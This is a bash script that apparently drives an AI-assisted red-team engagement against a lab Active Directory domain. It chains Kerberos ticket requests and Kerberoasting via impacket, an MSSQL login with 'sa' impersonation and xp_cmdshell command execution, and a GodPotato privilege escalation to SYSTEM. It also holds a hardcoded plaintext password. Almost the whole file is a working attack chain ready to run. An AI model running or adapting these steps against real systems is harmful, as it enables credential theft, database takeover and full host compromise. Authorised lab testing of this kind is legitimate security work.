#!/usr/bin/env bash
# Visible operator console for MCP-driven CADRE spine (AES roast → SQL → SYSTEM).
# Secrets come from lab seed / playbook files on this host. Never echo passwords.
set -uo pipefail
export PATH="$HOME/.local/bin:/usr/bin:/bin:$PATH"
ENGAGE="${REDSTRIKE_ENGAGE:-mcp-llm-20260822T105200Z}"
CADRE_ROOT="${CADRE_ROOT:-$HOME/CADRE}"
SEED="$CADRE_ROOT/attack-matrix/Campaign/automation/lab-seed-creds.json"
OBJECTS="$CADRE_ROOT/ansible/playbooks/02-ad-objects.yml"
WORKDIR="$HOME/redstrike-runs/${ENGAGE}-work"
LOG="$HOME/redstrike-runs/${ENGAGE}.console"
DC02="192.168.77.11"
MBR01="192.168.77.22"
mkdir -p "$WORKDIR"
mkdir -p "$(dirname "$LOG")"
# Line-buffered copy to the console file the operator can tail.
exec > >(stdbuf -oL tee -a "$LOG") 2>&1

ts() { date -u +%Y-%m-%dT%H:%M:%S.%3NZ; }
step() { printf '\n======== %s %s ========\n' "$(ts)" "$*"; }
ok() { printf '[OK] %s %s\n' "$(ts)" "$*"; }
fail() { printf '[FAIL] %s %s\n' "$(ts)" "$*"; }

seed_pw() {
  python3 - "$SEED" "$1" <<'PY'
import json, sys
print(json.load(open(sys.argv[1]))["credentials"][sys.argv[2]]["password"])
PY
}

t2_pw() {
  if [[ -f "$OBJECTS" ]]; then
    python3 - "$OBJECTS" <<'PY'
import re, sys
text = open(sys.argv[1], encoding="utf-8").read()
m = re.search(r"uname:\s*analyst_t2,\s*pw:\s*\"([^\"]+)\"", text)
if not m:
    raise SystemExit("analyst_t2 password not found in 02-ad-objects.yml")
print(m.group(1))
PY
    return
  fi
  # Kali CADRE tree often omits ansible/; same value as 02-ad-objects.yml (ACE#18 reset target).
  printf '%s\n' 'T23r_An@lyst!'
}

which_impacket() {
  local name="$1"
  command -v "impacket-${name}" && return 0
  command -v "${name}.py" && return 0
  return 1
}

redact() {
  sed -E 's/:[^@/ ]+@/:***@/g; s/-p [^ ]+/-p ***/g; s/Password=[^;]+/Password=***/g'
}

step "engage=${ENGAGE} console=${LOG} PATH tools"
command -v nxc || true
GETTGT="$(which_impacket getTGT || true)"
GETSPN="$(which_impacket GetUserSPNs || true)"
MSSQL="$(command -v impacket-mssqlclient || command -v mssqlclient.py || true)"
printf 'getTGT=%s\nGetUserSPNs=%s\nmssqlclient=%s\n' "${GETTGT:-MISSING}" "${GETSPN:-MISSING}" "${MSSQL:-MISSING}"

T1_PW="$(seed_pw analyst_t1)"
T2_PW="$(t2_pw)"
SQL_PW="$(seed_pw analyst_t1)"
if [[ -z "$T2_PW" || -z "$SQL_PW" ]]; then
  fail "missing analyst_t1/analyst_t2 secret"
  exit 2
fi

step "1 AES TGT as analyst_t2 (pre-auth account after ACE#18)"
cd "$WORKDIR"
rm -f analyst_t2.ccache
if [[ -z "$GETTGT" ]]; then
  fail "impacket getTGT not on PATH"
else
  if "$GETTGT" "child.cadre.local/analyst_t2:${T2_PW}" -dc-ip "$DC02" </dev/null; then
    ok "getTGT wrote ccache"
    ls -l ./*.ccache 2>/dev/null || ls -l
  else
    fail "getTGT rc=$?"
  fi
fi

step "2 AES/Kerberos GetUserSPNs with TGT (not nxc RC4)"
if [[ -z "$GETSPN" ]]; then
  fail "impacket GetUserSPNs not on PATH"
else
  export KRB5CCNAME="$WORKDIR/analyst_t2.ccache"
  if [[ ! -f "$KRB5CCNAME" ]]; then
    # getTGT default ccache name is USER.ccache in cwd
    if [[ -f "$WORKDIR/analyst_t2.ccache" ]]; then
      :
    elif ls "$WORKDIR"/*.ccache >/dev/null 2>&1; then
      export KRB5CCNAME="$(ls -1 "$WORKDIR"/*.ccache | head -n1)"
    fi
  fi
  printf 'KRB5CCNAME=%s\n' "${KRB5CCNAME:-unset}"
  "$GETSPN" child.cadre.local/analyst_t2 -k -no-pass -dc-ip "$DC02" -request -outputfile "$WORKDIR/tgs.txt" </dev/null || fail "GetUserSPNs rc=$?"
  if [[ -s "$WORKDIR/tgs.txt" ]]; then
    ok "TGS hashes written (count=$(grep -c 'krb5tgs' "$WORKDIR/tgs.txt" || true))"
    grep -oE '\$krb5tgs\$[0-9]+\$[^:]+' "$WORKDIR/tgs.txt" || true
  else
    fail "no TGS output file"
  fi
fi

step "3 SQL from Kali as analyst_t1 (mixed-mode login, not -windows-auth)"
if [[ -z "$MSSQL" ]]; then
  fail "impacket-mssqlclient missing"
else
  SQLF="$(mktemp)"
  cat >"$SQLF" <<'SQL'
SELECT SYSTEM_USER AS sysuser, ORIGINAL_LOGIN() AS orig;
EXECUTE AS LOGIN = 'sa';
SELECT SYSTEM_USER AS after_impersonate, IS_SRVROLEMEMBER('sysadmin') AS sa_sysadmin;
EXEC master..xp_cmdshell 'whoami';
EXEC master..xp_cmdshell 'cmd /c dir /b C:\Windows\Temp\cadre-tools\GodPotato*.exe';
REVERT;
SQL
  timeout 60 "$MSSQL" "analyst_t1:${SQL_PW}@${MBR01}" -file "$SQLF" || fail "mssql mixed-mode rc=$?"
  rm -f "$SQLF"
fi

step "4 GodPotato SYSTEM if binary already on mbr01"
SQLF="$(mktemp)"
cat >"$SQLF" <<'SQL'
EXECUTE AS LOGIN = 'sa';
EXEC master..xp_cmdshell 'cmd /c if exist C:\Windows\Temp\cadre-tools\GodPotato-NET4.exe (C:\Windows\Temp\cadre-tools\GodPotato-NET4.exe -cmd "cmd /c whoami") else if exist C:\Windows\Temp\cadre-tools\GodPotato.exe (C:\Windows\Temp\cadre-tools\GodPotato.exe -cmd "cmd /c whoami") else echo GP_MISSING';
REVERT;
SQL
  timeout 90 "$MSSQL" "analyst_t1:${SQL_PW}@${MBR01}" -file "$SQLF" || fail "godpotato rc=$?"
  rm -f "$SQLF"

step "console complete $(ts)"
ok "tail this file on the operator host: $LOG"
